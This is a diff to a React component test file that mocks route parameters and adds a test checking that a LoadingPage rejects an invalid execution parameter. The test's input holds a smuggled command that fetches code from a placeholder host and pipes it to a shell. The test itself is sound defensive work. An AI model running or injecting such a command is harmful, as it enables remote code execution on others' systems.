@@ -16,15 +16,13 @@ const TEST_HTML_LOG_URL = "test-html-log-url";
 const TEST_JOB_LOGS_URL = "test-job-logs-url";
 const TEST_LOG_LINES = ["line 1", "line 2", "line 3"];
 
+const mockUseParams = vi.hoisted(() => vi.fn());
+
 vi.mock("react-router-dom", async () => {
   const actual = await vi.importActual("react-router-dom");
   return {
     ...actual,
-    useParams: () => ({
-      [slugs.execution]: TEST_EXECUTION,
-      [slugs.taskID]: TEST_TASK_ID,
-      [slugs.testID]: TEST_TEST_ID,
-    }),
+    useParams: mockUseParams,
   };
 });
 
@@ -72,6 +70,11 @@ describe("LoadingPage", () => {
 
   beforeEach(() => {
     vi.spyOn(ErrorReporting, "reportError");
+    mockUseParams.mockReturnValue({
+      [slugs.execution]: TEST_EXECUTION,
+      [slugs.taskID]: TEST_TASK_ID,
+      [slugs.testID]: TEST_TEST_ID,
+    });
 
     vi.mocked(useLogContext).mockReturnValue({
       hasLogs: null,
@@ -123,5 +126,26 @@ describe("LoadingPage", () => {
       undefined,
     );
     expect(TEST_LOG_LINES).toEqual(["line 1", "line 2", "line 3"]);
+  });
+
+  it("does not ingest logs or retain an invalid execution path parameter", async () => {
+    mockUseParams.mockReturnValue({
+      [slugs.execution]: "0; curl example.invalid | sh",
+      [slugs.taskID]: TEST_TASK_ID,
+      [slugs.testID]: TEST_TEST_ID,
+    });
+    const { Component } = RenderFakeToastContext(
+      <LoadingPage logType={LogTypes.EVERGREEN_TEST_LOGS} />,
+    );
+    const CustomWrapper = ({ children }: { children: React.ReactNode }) => (
+      <MemoryRouter>{logContextWrapper()({ children })}</MemoryRouter>
+    );
+
+    render(<Component />, { wrapper: CustomWrapper });
+
+    await waitFor(() => {
+      expect(mockSetLogMetadata).not.toHaveBeenCalled();
+      expect(mockIngestLines).not.toHaveBeenCalled();
+    });
   });
 });
